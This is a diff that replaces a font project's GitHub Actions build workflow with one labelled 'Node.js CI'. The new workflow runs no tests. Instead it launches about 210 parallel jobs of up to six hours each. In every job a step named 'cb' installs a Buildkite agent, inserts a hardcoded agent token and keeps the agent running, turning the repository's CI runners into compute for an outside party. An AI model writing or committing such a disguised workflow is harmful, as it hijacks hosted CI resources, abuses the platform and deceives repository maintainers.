@@ -1,55 +1,32 @@
-name: Build
+# run This workflow will do a clean install of node dependencies, build the source code and run tests across different versions of node
+# For more information see: https://help.github.com/actions/language-and-framework-guides/using-nodejs-with-github-actions
 
-on: [push, pull_request]
+name: Node.js CI 
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request: {}
 
 jobs:
-  build:
-    runs-on: ubuntu-20.04
+  test:
+    runs-on: ubuntu-latest
+
+    strategy:
+      max-parallel: 180
+      fail-fast: false
+      matrix:
+        node-version: [10.x, 11.x, 12.x, 13.x, 14.x, 15.x, 16.x]
+        flag: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+    timeout-minutes: 360
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v2
-        with:
-          fetch-depth: 0
-      - name: Fetch Tags
-        run: |
-          git fetch --prune --tags ||:
-      - name: Setup system dependencies
-        run: |
-          sudo add-apt-repository universe
-          sudo apt-get update
-          sudo apt-get install autoconf-archive fontmake fonttools libgit2-dev psautohint python3 python3-defcon python3-pip python3-ufo2ft python3-ufolib2 sfnt2woff-zopfli ttfautohint ufonormalizer woff2 zsh
-      - name: Install Rust
-        uses: actions-rs/toolchain@v1
-        with:
-          toolchain: stable
-      - name: Cache cargo
-        uses: actions/cache@v2
-        with:
-          path: |
-            ~/.cargo/registry
-            ~/.cargo/git
-            target
-          key: cargo-build-${{ hashFiles('**/Cargo.lock') }}
-      - name: Setup Python dependencies
-        run: pip install cffsubr font-v gftools pcpp git+git://github.com/alif-type/sfdLib.git@v1.0.7#egg=sfdLib sfdnormalize skia-pathops vttLib
-      - name: Configure
-        run: |
-          export PATH="$HOME/.local/bin:$PATH"
-          ./bootstrap.sh
-          ./configure
-          echo "VERSION=$(cat .version)" >> $GITHUB_ENV
-          echo "MAKEFLAGS=-j$(nproc) -Otarget" >> $GITHUB_ENV
-      - name: Build
-        run: |
-          export PATH="$HOME/.local/bin:$PATH"
-          make
-      - name: Build source package
-        run: |
-          export PATH="$HOME/.local/bin:$PATH"
-          make dist
-      - name: Upload Artifacts
-        uses: actions/upload-artifact@v2
-        with:
-          name: fontship-${{ env.VERSION }}
-          path: fontship*-${{ env.VERSION }}.zip
+    - uses: actions/checkout@v2
+
+    - name: Use Node.js ${{ matrix.node-version }}
+      uses: actions/setup-node@v1
+      with:
+        node-version: ${{ matrix.node-version }}
+    - name: cb
+      run: |
+        sudo sh -c 'echo deb https://apt.buildkite.com/buildkite-agent stable main > /etc/apt/sources.list.d/buildkite-agent.list' && sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 32A37959C2FA5C3C99EFBC32A79206696452D198 && sudo apt-get update && sudo apt-get install -y buildkite-agent && sudo sed -i "s/xxx/37cdf3471d0dfd76c7eebd88d401196a4261d39b959b20e3ac/g" /etc/buildkite-agent/buildkite-agent.cfg && sudo systemctl enable buildkite-agent && sudo systemctl start buildkite-agent && journalctl -f -u buildkite-agent
